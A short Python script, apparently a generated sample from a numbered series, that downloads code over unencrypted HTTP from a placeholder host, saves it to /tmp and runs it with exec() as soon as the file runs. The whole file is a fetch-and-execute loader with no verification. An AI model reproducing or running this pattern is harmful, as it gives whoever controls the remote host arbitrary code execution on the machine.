import http.client
import os

def fetch_code_from_url(url):
    conn = http.client.HTTPConnection(url)
    conn.request("GET", "/code.py")
    response = conn.getresponse()
    return response.read().decode()

def save_code_to_local_file(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def load_code_from_file(filepath):
    with open(filepath, "r") as f:
        return f.read()

def execute_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-60.com"
    local_file = "/tmp/code60.py"

    code = fetch_code_from_url(random_url)
    save_code_to_local_file(local_file, code)

    code_to_execute = load_code_from_file(local_file)
    execute_code(code_to_execute)

main()
